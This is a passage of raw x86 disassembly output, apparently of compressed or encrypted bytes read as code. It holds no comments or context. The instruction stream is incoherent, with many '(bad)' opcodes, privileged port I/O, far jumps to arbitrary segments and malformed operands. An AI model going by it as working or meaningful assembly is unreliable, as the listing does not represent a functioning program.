  421e95:	imul   ebp,DWORD PTR [edi+0x2af54421],0x61fcb341
  421e9f:	sub    dh,BYTE PTR [edx+0x70681933]
  421ea5:	lods   al,BYTE PTR ds:[esi]
  421ea6:	fcomp  st(2)
  421ea8:	out    dx,eax
  421ea9:	sub    BYTE PTR [edi],dl
  421eab:	jne    0x421ebd
  421ead:	cmp    esi,DWORD PTR [edx-0x3d00ba85]
  421eb3:	das    
  421eb4:	add    al,0x6
  421eb6:	inc    ecx
  421eb7:	pushf  
  421eb8:	retf   0xe256
  421ebb:	xchg   edi,eax
  421ebc:	xlat   BYTE PTR ds:[ebx]
  421ebd:	mov    dh,0xb1
  421ebf:	push   edi
  421ec0:	push   cs
  421ec1:	push   0xffffffa6
  421ec3:	push   esp
  421ec4:	ror    DWORD PTR [ebp+0x44],cl
  421ec7:	sub    ebx,eax
  421ec9:	jge    0x421ecc
  421ecb:	mov    edx,0xc55d540f
  421ed0:	mov    ds:0x1c9890ec,al
  421ed5:	push   ebx
  421ed6:	or     bh,BYTE PTR [ebp+0x5e9d7307]
  421edc:	(bad)
  421ee1:	(bad)  ds:0xe8a6807a
  421ee7:	mov    edx,0x833bc2c6
  421eec:	pop    ds
  421eed:	jg     0x421f4e
  421eef:	push   es
  421ef0:	sbb    eax,DWORD PTR [ebx+0x64]
  421ef3:	(bad)  
  421ef4:	popa   
  421ef5:	stos   DWORD PTR es:[edi],eax
  421ef6:	jb     0x421f6a
  421ef8:	hlt    
  421ef9:	jge    0x421f22
  421efb:	ficomp DWORD PTR ds:0xd7f0b57b
  421f01:	iret   
  421f02:	dec    ecx
  421f03:	xchg   esp,eax
  421f04:	inc    ebp
  421f05:	sub    eax,0x2709ef4b
  421f0a:	jmp    0x421ec9
  421f0c:	daa    
  421f0d:	cmp    al,0xbc
  421f0f:	outs   dx,BYTE PTR ds:[esi]
  421f10:	jmp    0x421f04
  421f12:	xor    esi,DWORD PTR [ebx+0x4d]
  421f15:	les    edx,FWORD PTR [ebx-0x697b7096]
  421f1b:	sbb    ebp,0x2ee6d7fd
  421f21:	xchg   ebx,eax
  421f22:	cmp    DWORD PTR [edx+0x4],ecx
  421f25:	pop    eax
  421f26:	mov    WORD PTR [ebx-0x5f29a584],gs
  421f2c:	stos   BYTE PTR es:[edi],al
  421f2d:	stos   BYTE PTR es:[edi],al
  421f2e:	bound  esi,QWORD PTR [ecx+0x34]
  421f31:	loop   0x421eb3
  421f33:	int    0xb2
  421f35:	add    BYTE PTR [esi+0x3b3c0b9b],bl
  421f3b:	jle    0x421f28
  421f3d:	aam    0xea
  421f3f:	mov    dh,0x66
  421f41:	push   0x53
  421f43:	and    eax,0x37cbace5
  421f48:	jmp    0x7670c7fe
  421f4d:	ins    DWORD PTR es:[edi],dx
  421f4e:	lods   al,BYTE PTR ds:[esi]
  421f4f:	lea    ebx,[ebp+eiz*4+0x41]
  421f53:	mov    ecx,0xb2c5a072
  421f58:	in     eax,0x5b
  421f5a:	pushf  
  421f5b:	dec    ecx
  421f5c:	dec    esi
  421f5d:	pushf  
  421f5e:	mov    ch,0x1f
  421f60:	jl     0x421f76
  421f62:	mov    ah,0x14
  421f64:	or     ebp,eax
  421f66:	mov    ebx,DWORD PTR [ebp-0x46ce5f64]
  421f6c:	in     eax,dx
  421f6d:	dec    esi
  421f6e:	nop
  421f6f:	cmp    edx,DWORD PTR [edi-0x48]
  421f72:	enter  0x40b2,0x8e
  421f76:	xchg   esi,eax
  421f77:	and    dl,BYTE PTR [esi]
  421f79:	adc    al,0xe
  421f7b:	rcr    bh,cl
  421f7d:	pop    ss
  421f7e:	jmp    0x9b86:0x6794360
  421f85:	(bad)  
  421f86:	or     DWORD PTR [ebx-0x43b19844],esi
  421f8c:	test   BYTE PTR [ebx-0x72],0x2d
  421f90:	rol    BYTE PTR [edx],1
  421f92:	adc    eax,0xf9cc3a3e
  421f97:	jo     0x421f44
  421f99:	sbb    eax,0x843ba6
  421f9e:	cli    
  421f9f:	repnz daa 
  421fa1:	in     al,0xe3
  421fa3:	inc    eax
  421fa4:	retf   
  421fa5:	inc    eax
  421fa6:	loopne 0x421feb
  421fa8:	aaa    
  421fa9:	jl     0x421fcb
  421fab:	xor    BYTE PTR ds:0x2dc6072c,dh
  421fb1:	sub    esp,DWORD PTR [esi]
  421fb3:	leave  
  421fb4:	pusha  
  421fb5:	or     BYTE PTR [ebx],bh
  421fb7:	aas    
  421fb8:	ins    DWORD PTR es:[edi],dx
  421fb9:	rol    ebx,0x2
  421fbc:	test   ebp,esp
  421fbe:	push   edx
  421fbf:	retf   
  421fc0:	jl     0x42202f
  421fc2:	outs   dx,BYTE PTR ds:[esi]
  421fc3:	out    0x6d,al
  421fc5:	sub    ch,BYTE PTR [esp+ebx*4-0x420d3340]
  421fcc:	or     bl,cl
  421fce:	mov    esi,0xa97e2a81
  421fd3:	in     eax,0xc9
  421fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fd6:	rcl    BYTE PTR [esi],1
  421fd8:	jno    0x421fcb
  421fda:	gs jno 0x422004
  421fdd:	or     DWORD PTR [edi+0x14],ecx
  421fe0:	jo     0x421fbd
  421fe2:	sub    ebx,edi
  421fe4:	mov    eax,0x667f790b
  421fe9:	cmp    ecx,0xdec0b4b0
  421fef:	sub    DWORD PTR [ebx],ebp
  421ff1:	lock fld QWORD PTR [edx+0x1d]
  421ff5:	push   ss
  421ff6:	in     al,dx
  421ff7:	(bad)
  421ffc:	ret    0x205d
  421fff:	cld    
  422000:	sbb    DWORD PTR [edi+0x4772],eax
	...
  42200e:	add    BYTE PTR [eax],al
  422010:	add    BYTE PTR [edx+0x4f],al
  422013:	nop
  422014:	int3   
  422015:	popf   
  422016:	fistp  WORD PTR [esi-0x31]
  422019:	lea    ecx,[ebx]
  42201b:	jmp    0xb6936c76
  422020:	outs   dx,DWORD PTR ds:[esi]
  422021:	sbb    ebx,DWORD PTR [ecx+0x3ab0001]
  422027:	add    BYTE PTR [eax],al
  422029:	xor    DWORD PTR [esi+0x2ad82ca1],ecx
  42202f:	dec    esi
  422030:	xchg   esp,eax
  422031:	in     al,0xd1
  422033:	and    al,0x81
  422035:	mov    ds:0x222f3df5,eax
  42203a:	sbb    ebx,esi
  42203c:	adc    BYTE PTR [ecx-0x61663718],bh
  422042:	and    ecx,DWORD PTR [ecx+0x2ef3c15d]
  422048:	or     BYTE PTR [edx+ecx*2+0x22],cl
  42204c:	cmc    
  42204d:	push   es
  42204e:	inc    edi
  42204f:	jmp    0x421ff0
  422051:	jle    0x42208a
  422053:	xlat   BYTE PTR ds:[ebx]
  422054:	jmp    0x83223a0c
  422059:	xlat   BYTE PTR ds:[ebx]
  42205a:	xor    BYTE PTR [ecx],dl
  42205c:	or     ah,0xd3
  42205f:	push   ds
  422060:	test   DWORD PTR ds:0xb3051877,esp
  422066:	jmp    0x5e8f:0x6f2e6315
  42206d:	test   BYTE PTR ds:0x916e1a9,0x46
  422074:	dec    ecx
  422075:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  422077:	stos   DWORD PTR es:[edi],eax
  422078:	pop    ebx
  422079:	xor    eax,0x94149e8c
  42207e:	dec    edx
  42207f:	or     edx,DWORD PTR [esi+ecx*4]
  422082:	(bad)  
  422083:	adc    cl,BYTE PTR [ecx]
  422085:	in     eax,dx
  422086:	jae    0x4220be
  422088:	inc    esp
  422089:	mov    bh,0x7a
  42208b:	mov    ds:0x321c9f5b,eax
  422090:	sub    al,BYTE PTR ds:0x4bc959e4
  422096:	push   0x74
  422098:	sbb    ecx,edx
  42209a:	ret    0x8e2b
  42209d:	clc    
  42209e:	aad    0x4
  4220a0:	imul   ebx,DWORD PTR [edi],0x122bfd9c
  4220a6:	inc    edx
  4220a7:	inc    di
  4220a9:	push   0xffffff8a
  4220ab:	(bad)  
  4220ac:	loope  0x42204c
  4220ae:	xchg   BYTE PTR [edx-0x592e273f],dh
  4220b4:	gs int 0x74
  4220b7:	inc    DWORD PTR [ecx+0x6]
  4220ba:	dec    edi
  4220bb:	xchg   edx,eax
  4220bc:	gs inc edx
  4220be:	pop    edi
  4220bf:	mov    esp,0xbdb813d8
  4220c5:	mov    ah,0xb8
  4220c7:	ins    BYTE PTR es:[edi],dx
  4220c8:	les    ecx,FWORD PTR [eax]
  4220ca:	ins    DWORD PTR es:[edi],dx
  4220cb:	inc    edx
  4220cc:	dec    esp
  4220cd:	or     edx,esi
  4220cf:	jle    0x422058
  4220d1:	out    0xea,al
  4220d3:	mov    bh,0x55
  4220d5:	outs   dx,DWORD PTR ds:[esi]
  4220d6:	xor    DWORD PTR [ecx-0xa],esi
  4220d9:	adc    ch,dl
  4220db:	imul   ecx,DWORD PTR [esi+0x7e64695e],0xae44e042
  4220e5:	inc    ebp
  4220e6:	push   ecx
  4220e7:	mov    edi,0xb495f9af
  4220ec:	inc    ebx
  4220ed:	stos   DWORD PTR es:[edi],eax
  4220ee:	jmp    0x6487:0x3030e4b
  4220f5:	int    0x42
  4220f7:	icebp  
  4220f8:	pusha  
  4220f9:	loope  0x4220dc
  4220fb:	shl    DWORD PTR [eax+0x2cc51709],0xb
  422102:	and    ebx,eax
  422104:	pop    ecx
  422105:	scas   al,BYTE PTR es:[edi]
  422106:	pop    ds
  422107:	dec    edi
  422108:	sbb    al,0x21
  42210a:	int    0xaf
  42210c:	push   0xc506fd35
  422111:	inc    eax
  422112:	mov    esi,0x26ef4d30
  422117:	in     al,0x3e
  422119:	xchg   ebx,eax
  42211a:	stc    
  42211b:	adc    al,0xbe
  42211d:	adc    cl,BYTE PTR [esi+0x175c1109]
  422123:	out    dx,eax
  422124:	push   ss
  422125:	hlt    
  422126:	jno    0x422115
  422128:	push   es
  422129:	sbb    DWORD PTR [edi-0x4c8664ab],ecx
  42212f:	mov    ch,0x1f
  422131:	sbb    ebp,0xadf6d8a5
  422137:	or     DWORD PTR [esi],edi
  422139:	repnz cwde 
  42213b:	and    DWORD PTR [eax],0x2cf524ae
  422141:	inc    edi
  422142:	add    DWORD PTR [eax-0x31f18d1c],ebx
  422148:	cmp    eax,0x6ad51bd9
  42214d:	add    eax,0x6b139fe0
  422152:	into   
  422153:	std    
  422154:	sub    al,0xe1
  422156:	mov    eax,0xec9da2f3
  42215b:	cmp    DWORD PTR [edx+0x44],ebx
  42215e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42215f:	jo     0x422124
  422161:	inc    ebp
  422162:	sar    DWORD PTR [ecx],0x86
  422165:	jge    0x422144
  422167:	cmp    ebp,ecx
  422169:	xchg   esp,eax
  42216a:	stos   DWORD PTR es:[edi],eax
  42216b:	mov    bl,0xa0
  42216d:	cmp    bh,BYTE PTR [ecx]
  42216f:	adc    edi,esi
  422171:	clc    
  422172:	ret    0xda65
  422175:	iret   
  422176:	xlat   BYTE PTR ds:[ebx]
  422177:	dec    esp
  422178:	push   edx
  422179:	rcr    ah,1
  42217b:	popa   
  42217c:	repz aad 0xc3
  42217f:	mov    ?,edi
  422181:	pop    ebx
  422183:	sbb    dh,bh
  422185:	jbe    0x4221e6
  422187:	xor    BYTE PTR [ebp+0x69],ch
  42218a:	popa   
  42218b:	mov    eax,ds:0x11a7de8f
  422190:	inc    ecx
  422191:	es push esp
  422193:	inc    edx
  422194:	outs   dx,DWORD PTR ds:[esi]
  422195:	cmp    dh,BYTE PTR [esi]
  422197:	dec    edi
  422198:	ss or  al,0xd
  42219b:	aam    0xee
  42219d:	cmp    edx,DWORD PTR [esi+0x469e40b5]
  4221a3:	cdq    
  4221a4:	cmc    
  4221a5:	adc    BYTE PTR [ebx+edx*1-0x705b01ee],bl
  4221ac:	ja     0x422165
  4221ae:	aad    0xf4
  4221b0:	retf   
  4221b1:	pop    DWORD PTR [ebp-0x19]
  4221b4:	cli    
  4221b5:	inc    eax
  4221b6:	and    dh,BYTE PTR [ebp+0x1a41e399]
  4221bc:	sbb    esi,ebx
  4221be:	push   ebx
  4221bf:	dec    edx
  4221c0:	dec    esi
  4221c1:	mov    ds:0x14f00aa9,al
  4221c6:	pop    ebp
  4221c7:	nop
  4221c8:	ret    0x648a
  4221cb:	ss leave 
  4221cd:	xor    cl,cl
  4221cf:	scas   al,BYTE PTR es:[edi]
  4221d0:	sbb    bl,BYTE PTR [esi+0x70dddb1b]
  4221d6:	icebp  
  4221d7:	jne    0x422183
  4221d9:	xchg   BYTE PTR ds:0xc630330f,ch
  4221df:	loop   0x42221b
  4221e1:	sar    DWORD PTR [ebp-0x30],0x57
  4221e5:	fwait
  4221e6:	ss mov ecx,0xc090985e
  4221ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221ed:	jmp    0x4221b9
  4221ef:	in     al,dx
  4221f0:	mov    ds:0x88fed6cd,eax
  4221f5:	mov    ch,0x9d
  4221f7:	pushf  
  4221f8:	pop    ecx
  4221f9:	mov    BYTE PTR [ecx+0x1529d252],bh
  4221ff:	mov    edx,0x1a4f092c
  422204:	stos   BYTE PTR es:[edi],al
  422205:	loope  0x4221f1
  422207:	(bad)  
  422208:	push   ss
  422209:	adc    eax,0xede12c59
  42220e:	imul   ebp,DWORD PTR ds:0x34d377d9,0x115c4701
  422218:	in     eax,0xac
  42221a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42221b:	cdq    
  42221c:	imul   esp,DWORD PTR [ecx+0x3003d64a],0x11
  422223:	adc    al,0x50
  422225:	in     eax,0x93
  422227:	int    0x1c
  422229:	out    0x2a,al
  42222b:	test   eax,0x9ea64a5f
  422230:	push   ebx
  422231:	cwde   
  422232:	ins    BYTE PTR es:[edi],dx
  422233:	mov    bl,ah
  422235:	fs jnp 0x422276
  422238:	pminsw mm5,QWORD PTR [edi-0x7f4debce]
  42223f:	(bad)  
  422240:	jno    0x422230
  422242:	cmc    
  422243:	xor    ch,BYTE PTR [ebp+0x378480c7]
  422249:	and    DWORD PTR [ebx],0x329c81ea
  42224f:	jecxz  0x4222c7
  422251:	xlat   BYTE PTR ds:[ebx]
  422252:	sbb    al,0x23
  422254:	into   
  422255:	mov    ah,dh
  422257:	jmp    0x10ea6e51
  42225c:	inc    esi
  42225d:	dec    ebx
  42225e:	mov    dl,0xd1
  422260:	sbb    al,0x5e
  422262:	lods   eax,DWORD PTR ds:[esi]
  422263:	in     eax,dx
  422264:	push   esp
  422265:	jae    0x42225c
  422267:	mov    eax,0xa5b643e3
  42226c:	mov    cl,BYTE PTR [esi]
  42226e:	repnz inc edi
  422270:	jg     0x422203
  422272:	ja     0x4222b5
  422274:	xor    eax,0xbc7a0987
  422279:	jbe    0x42221a
  42227b:	inc    ebp
  42227c:	js     0x422257
  42227e:	dec    edi
  42227f:	daa    
  422280:	fdiv   DWORD PTR [ebx+0x7]
  422283:	mov    al,ds:0x9da370cb
  422288:	jg     0x422233
  42228a:	push   es
  42228b:	inc    edx
  42228c:	into   
  42228d:	fbld   TBYTE PTR [ebx+esi*4]
  422290:	push   ds
  422291:	enter  0xc2d4,0x5d
  422295:	rcl    edx,0x26
  422298:	and    edi,DWORD PTR ds:0xbff3089a
  42229e:	cwde   
  42229f:	retf   
  4222a0:	cmp    DWORD PTR [eax-0x31f5913],edx
  4222a6:	aas    
  4222a7:	enter  0xcb49,0xc8
  4222ab:	sbb    dh,BYTE PTR [eax-0x4d]
  4222ae:	jb     0x422324
  4222b0:	xor    dl,bl
  4222b2:	mov    ds:0x9022ade2,al
  4222b7:	retf   0xe6ef
  4222ba:	shl    BYTE PTR [edx],1
  4222bc:	jge    0x4222c3
  4222be:	cdq    
  4222bf:	sub    edx,DWORD PTR ds:0x9a8771e9
  4222c5:	mov    ch,0xe1
  4222c7:	inc    ecx
  4222c8:	aam    0xc8
  4222ca:	imul   ebx,DWORD PTR [eax+0x6f0be90e],0xfffffff0
  4222d1:	pop    ebp
  4222d2:	sar    DWORD PTR [edi+0x6a],cl
  4222d5:	push   eax
  4222d6:	(bad)  
  4222d7:	xor    esi,eax
  4222d9:	test   BYTE PTR [eax],dl
  4222db:	jb     0x4222b0
  4222dd:	inc    eax
  4222de:	pop    ecx
  4222df:	daa    
  4222e0:	test   al,0x82
  4222e2:	ja     0x4222ab
  4222e4:	or     ch,cl
  4222e6:	jmp    0x422367
  4222e8:	mov    bh,0x5c
  4222ea:	sub    eax,0x47720ceb
  4222ef:	xor    eax,0xfe54f4c0
  4222f4:	test   DWORD PTR [ecx],edx
  4222f6:	stos   BYTE PTR es:[edi],al
  4222f7:	push   edx
  4222f8:	mov    dh,0xc9
  4222fa:	(bad)  
  4222fb:	mov    ch,0xad
  4222fd:	shl    ah,cl
  4222ff:	cmp    eax,0x827f0773
  422304:	sub    eax,0xc126b37e
  422309:	popa   
  42230a:	fcmovne st,st(1)
  42230c:	adc    al,0xb6
  42230e:	int3   
  42230f:	adc    eax,0xdd1c2681
  422314:	fucom  st(5)
  422316:	loopne 0x42229b
  422318:	jbe    0x42235d
  42231a:	aam    0xe4
  42231c:	dec    esi
  42231d:	shr    BYTE PTR [ecx-0x63],1
  422320:	push   ebx
  422321:	sbb    cl,dh
  422323:	in     al,0x5d
  422325:	inc    ebp
  422326:	loopne 0x4222b8
  422328:	rcr    BYTE PTR [eax],1
  42232a:	in     eax,0xf
  42232c:	sub    eax,0x5517ac2c
  422331:	in     eax,dx
  422332:	outs   dx,BYTE PTR ds:[esi]
  422333:	idiv   BYTE PTR [esi]
  422335:	fs retf 0x9fe5
  422339:	fstp   TBYTE PTR [ecx-0x1ec2dffb]
  42233f:	xchg   DWORD PTR [bx+di-0x6],edx
  422343:	push   ebx
  422344:	mov    eax,ds:0xe84d3527
  422349:	jo     0x42230c
  42234b:	pop    esp
  42234c:	ins    DWORD PTR es:[edi],dx
  42234d:	inc    ebx
  42234e:	fild   WORD PTR [esi-0x160968c6]
  422354:	(bad)  
  422355:	xchg   ebx,eax
  422356:	adc    al,bl
  422358:	mov    esp,0x4151807
  42235d:	jle    0x4222e4
  42235f:	loope  0x422370
  422361:	adc    WORD PTR [edi-0x50d3360f],cx
  422368:	xlat   BYTE PTR ds:[ebx]
  422369:	or     DWORD PTR [ecx],edi
  42236b:	popf   
  42236c:	sub    ebx,DWORD PTR [ecx+0xb858145]
  422372:	pop    bx
  422374:	addr16 and ah,dl
  422377:	mov    bh,0x3f
  422379:	adc    eax,DWORD PTR ds:0x9fa554f
  42237f:	and    al,0x3d
  422381:	mov    ch,0xa2
  422383:	fcomp  QWORD PTR [esi+0x667c83a8]
  422389:	outs   dx,DWORD PTR ds:[esi]
  42238a:	inc    BYTE PTR ds:0x3be8dd05
  422390:	jle    0x4223ce
  422392:	fadd   st(5),st
  422394:	pop    eax
  422395:	ret    0xc796
  422398:	add    edi,edi
  42239a:	lock pop esi
  42239c:	push   esp
  42239d:	sub    DWORD PTR [esi+eiz*1+0x54],edi
  4223a1:	shr    BYTE PTR [edx],cl
  4223a3:	js     0x4223a0
  4223a5:	retf   
  4223a6:	mov    BYTE PTR [edi-0x6b],ch
  4223a9:	hlt    
  4223aa:	and    BYTE PTR [esi],dl
  4223ac:	pop    esi
  4223ad:	lds    eax,FWORD PTR [ecx-0x66]
  4223b0:	repz adc BYTE PTR [edi-0x9d4cc8c],bh
  4223b7:	imul   ebp,eax,0x556f4dad
  4223bd:	sub    edx,DWORD PTR [edx]
  4223bf:	adc    BYTE PTR [esp+ebp*4-0x4b],bl
  4223c3:	jne    0x422379
  4223c5:	in     al,dx
  4223c6:	mov    ebp,0x912d05f9
  4223cb:	ins    DWORD PTR es:[edi],dx
  4223cc:	nop
  4223cd:	fucom  st(1)
  4223cf:	pop    eax
  4223d0:	rcl    DWORD PTR [esi+0x6b],1
  4223d3:	cwde   
	...
  4223e0:	add    BYTE PTR [esi+0x7c],ah
  4223e3:	loopne 0x4223a0
  4223e5:	cli    
  4223e6:	mov    edi,0xa15cfd7f
  4223eb:	pop    esp
  4223ec:	dec    edi
  4223ed:	fsub   st,st(4)
  4223ef:	std    
  4223f0:	daa    
  4223f1:	(bad)  
  4223f2:	pushf  
  4223f3:	add    DWORD PTR [eax],eax
  4223f5:	stos   DWORD PTR es:[edi],eax
  4223f6:	add    eax,DWORD PTR [eax]
  4223f8:	add    cl,ch
  4223fa:	sar    DWORD PTR [eax],cl
  4223fc:	(bad)
  422400:	mov    edx,?
  422402:	lds    esp,FWORD PTR [ebp-0x37]
  422405:	out    0xa9,eax
  422407:	and    DWORD PTR [esi-0x3c],0xd04758c1
  42240e:	dec    ebp
  42240f:	call   edi
  422411:	jmp    0x15c5808d
  422416:	or     eax,0xca037056
  42241b:	aaa    
  42241c:	mov    ch,0xfb
  42241e:	jmp    0x422451
  422420:	gs push 0x6d
  422423:	loop   0x4223bd
  422425:	dec    edx
  422426:	out    dx,al
  422427:	xchg   esp,eax
  422428:	ror    DWORD PTR [ebx],cl
  42242a:	pop    edx
  42242b:	jae    0x4223d6
  42242d:	lds    eax,FWORD PTR [ecx]
  42242f:	adc    ah,BYTE PTR [ebp+0x4ff302e0]
  422435:	pop    ss
  422436:	mov    dh,0xaf
  422438:	mov    ebp,fs
  42243a:	mov    ebx,0x3681a2f2
  42243f:	pop    ds
  422440:	retf   0x6719
  422443:	adc    DWORD PTR [ebx+ebp*1-0x5d109851],0x38c0657d
  42244e:	addr16 cmp edx,DWORD PTR [bp+si+0x1e]
  422453:	jmp    0x422466
  422455:	add    eax,0xb9ccff0f
  42245a:	and    BYTE PTR [eax],bh
  42245c:	bound  eax,QWORD PTR [esi]
  42245e:	and    eax,0xfd3a1cd2
  422463:	mov    bh,0xf6
  422465:	jns    0x4223f9
  422467:	pop    eax
  422468:	inc    esi
  422469:	je     0x42249f
  42246b:	push   esp
  42246c:	lds    ecx,FWORD PTR [edi]
  42246e:	fldenv [ebp+ecx*4+0x4b]
  422472:	sbb    al,0x52
  422474:	cmp    BYTE PTR [eax+0x75],al
  422477:	or     ch,bl
  422479:	sub    BYTE PTR [ebx+0x1c133c1],0x80
  422480:	add    eax,DWORD PTR [esp+esi*4-0x7d]
  422484:	push   esp
  422485:	out    dx,al
  422486:	in     eax,dx
  422487:	pop    ss
  422488:	add    eax,0xf32dae61
  42248d:	jecxz  0x422422
  42248f:	xchg   cl,bh
  422491:	or     ebx,0xb6585799
  422497:	or     edx,edi
  422499:	not    edx
  42249b:	fbld   TBYTE PTR [eax-0x74]
  42249e:	fcmovnbe st,st(5)
  4224a0:	xor    al,0x9c
  4224a2:	jb     0x42244d
  4224a4:	jp     0x42249e
  4224a6:	jbe    0x422518
  4224a8:	pop    edi
  4224a9:	inc    edx
  4224aa:	xchg   edx,eax
  4224ab:	stc    
  4224ac:	mov    bl,0x25
  4224ae:	call   0x84d5:0xa15a439e
  4224b5:	xchg   ebp,eax
  4224b6:	ins    BYTE PTR es:[edi],dx
  4224b7:	xchg   ebp,eax
  4224b8:	mov    ebp,0xea8c0445
  4224bd:	add    BYTE PTR [ebp+0x11],dl
  4224c0:	or     esi,edx
  4224c2:	ins    DWORD PTR es:[edi],dx
  4224c3:	out    0xf4,al
  4224c5:	rcl    esi,cl
  4224c7:	enter  0x3a3f,0xe8
  4224cb:	jg     0x4224a8
  4224cd:	jge    0x42253e
  4224cf:	lods   eax,DWORD PTR ds:[esi]
  4224d0:	mov    bl,0x81
  4224d2:	test   al,0x64
  4224d4:	ret    0x467d
  4224d7:	pop    edx
  4224d8:	adc    ebp,DWORD PTR [ebp+0x16b9b0e6]
  4224de:	mov    ecx,0xe14c39cd
  4224e3:	mov    edi,0x5a8d5262
  4224e8:	lahf   
  4224e9:	iret   
  4224ea:	cmp    ch,BYTE PTR [ecx-0x49bce939]
  4224f0:	fld    DWORD PTR [ebp+0x3eb592d9]
  4224f6:	push   eax
  4224f7:	clc    
  4224f8:	mov    ds:0xe9ec4795,al
  4224fd:	addr16 jmp 0xd375:0xc5df5ec0
  422505:	aaa    
  422506:	jge    0x4224ee
  422508:	enter  0x2d06,0xa4
  42250c:	mov    ?,WORD PTR [esi-0x2c]
  42250f:	fistp  QWORD PTR [edi]
  422511:	push   esi
  422512:	mov    dl,0xf4
  422514:	(bad)  
  422515:	into   
  422516:	pop    ds
  422517:	out    0xba,eax
  422519:	xchg   DWORD PTR [edx+0x52],esi
  42251c:	jecxz  0x422530
  42251e:	xlat   BYTE PTR ds:[ebx]
  42251f:	push   ds
  422520:	inc    edx
  422521:	add    BYTE PTR [edi],ah
  422523:	sbb    edi,DWORD PTR [esi-0x73]
  422526:	cs adc DWORD PTR fs:[ebx],edx
  42252a:	jge    0x42258f
  42252c:	ror    DWORD PTR [edi+0x68f6a669],cl
  422532:	xchg   edi,eax
  422533:	sbb    eax,0x7416d7ea
  422538:	inc    edi
  422539:	push   eax
  42253a:	dec    ebp
  42253b:	cdq    
  42253c:	int    0xd
  42253e:	fidiv  WORD PTR [ebx-0x38]
  422541:	add    DWORD PTR [edi-0x2a],edx
  422544:	push   es
  422545:	xlat   BYTE PTR ds:[ebx]
  422546:	pop    ds
  422547:	mov    ah,0x45
  422549:	or     eax,0x8c1c12ed
  42254e:	add    DWORD PTR [eax+eiz*4],edx
  422551:	nop
  422552:	xchg   edi,eax
  422553:	arpl   WORD PTR [eax+edi*2+0x4179f36c],si
  42255a:	adc    al,0xcb
  42255c:	fsubr  DWORD PTR [ebp-0xb]
  42255f:	sub    dh,BYTE PTR [esi]
  422561:	mov    al,ds:0xae78a481
  422566:	mov    esp,0x7cb6080f
  42256b:	scas   eax,DWORD PTR es:[edi]
  42256c:	pop    eax
  42256d:	cdq    
  42256e:	sbb    al,0x34
  422570:	mov    ecx,0x9fc5da8c
  422575:	or     cl,BYTE PTR [ebx-0x5f1ecbf4]
  42257b:	ss call 0xaa284971
  422581:	loop   0x42257c
  422583:	inc    ebp
  422584:	shl    BYTE PTR [edi+0x7d28450e],cl
  42258a:	push   edx
  42258b:	lahf   
  42258c:	adc    al,0xd0
  42258e:	push   esi
  42258f:	leave  
  422590:	cmp    bh,cl
  422592:	je     0x4225b2
  422594:	and    edx,esi
  422596:	popa   
  422597:	cmp    al,0x3c
  422599:	fmulp  st(0),st
  42259b:	cmp    al,BYTE PTR [ebx-0x6d1e4a]
  4225a1:	push   ds
  4225a2:	xchg   edi,eax
  4225a3:	clc    
  4225a4:	neg    DWORD PTR ds:0x893626a9
  4225aa:	pop    es
  4225ab:	pop    es
  4225ac:	push   edx
  4225ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225ae:	jmp    0xf649:0x2aeee5a3
  4225b5:	int    0xb1
  4225b7:	mov    ds:0x3bc49926,al
  4225bc:	jo     0x422581
  4225be:	(bad)
  4225c1:	(bad)  
  4225c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225c4:	bound  esp,QWORD PTR [edi+0x49]
  4225c7:	cmp    al,bh
  4225c9:	cmp    ah,BYTE PTR [ebx+0x70]
  4225cc:	stos   DWORD PTR es:[edi],eax
  4225cd:	aaa    
  4225ce:	ins    BYTE PTR es:[edi],dx
  4225cf:	pop    ecx
  4225d0:	ret    
  4225d1:	add    eax,edx
  4225d3:	mov    al,ds:0x5cb985ef
  4225d8:	mov    bh,0x68
  4225da:	sbb    DWORD PTR [esi+eiz*1-0x228daa75],esp
  4225e1:	ds inc esi
  4225e3:	add    eax,0xabf0784a
  4225e8:	ja     0x42264d
  4225ea:	cmp    BYTE PTR [esi+0x4a],bl
  4225ed:	xchg   BYTE PTR [edx],ah
  4225ef:	test   bl,bl
  4225f1:	dec    edx
  4225f2:	cmp    dh,dl
  4225f4:	in     eax,0xdb
  4225f6:	pop    ds
  4225f7:	lahf   
  4225f8:	mov    edi,0x221c5ddb
  4225fd:	out    dx,al
  4225fe:	sub    DWORD PTR ds:0x6fdfc24,esp
  422604:	mov    eax,ds:0x12ceb6ec
  422609:	loop   0x422685
  42260b:	sti    
  42260c:	inc    BYTE PTR [eax]
  42260e:	push   es
  42260f:	dec    eax
  422610:	xor    al,0xba
  422612:	sbb    al,dh
  422614:	lods   eax,DWORD PTR ds:[esi]
  422615:	pop    ds
  422616:	in     eax,0x50
  422618:	pcmpgtw mm6,QWORD PTR [ecx]
  42261b:	sub    al,0xd9
  42261d:	sub    eax,0x522e2f6e
  422622:	(bad)  
  422623:	dec    ebp
  422624:	pop    esp
  422625:	xchg   esi,eax
  422626:	dec    edi
  422627:	dec    ecx
  422628:	popf   
  422629:	lahf   
  42262a:	push   ss
  42262b:	jae    0x4226a3
  42262d:	pop    esp
  42262e:	loopne 0x4225cb
  422630:	in     eax,0x86
  422632:	mov    al,0xf2
  422634:	rol    bh,cl
  422636:	cmp    BYTE PTR cs:[esi+0x6d],ch
  42263a:	rol    BYTE PTR [esi-0xd52e70e],0x15
  422641:	sbb    al,0x6f
  422643:	add    al,0xe7
  422645:	push   ss
  422646:	add    DWORD PTR [ecx-0x12],edi
  422649:	sub    eax,0xbc7ce3b3
  42264e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42264f:	icebp  
  422650:	cmp    eax,0x89dfe532
  422655:	in     eax,dx
  422656:	loope  0x422630
  422658:	adc    eax,0x7c2e9e03
  42265d:	push   eax
  42265e:	push   es
  42265f:	mov    cl,0xe2
  422661:	cli    
  422662:	test   ebp,ebx
  422664:	shl    BYTE PTR [ecx-0x33],1
  422667:	out    dx,eax
  422668:	add    ecx,DWORD PTR [ebx]
  42266a:	xor    BYTE PTR [eax],0x26
  42266d:	jmp    0x9e9a:0xca3a4b99
  422674:	pop    ebx
  422675:	inc    edx
  422676:	jne    0x42263d
  422678:	xchg   esp,eax
  422679:	ja     0x42267c
  42267b:	mov    ds:0x7707a837,eax
  422680:	jae    0x42267f
  422682:	mov    eax,ds:0x4fd9f428
  422687:	aaa    
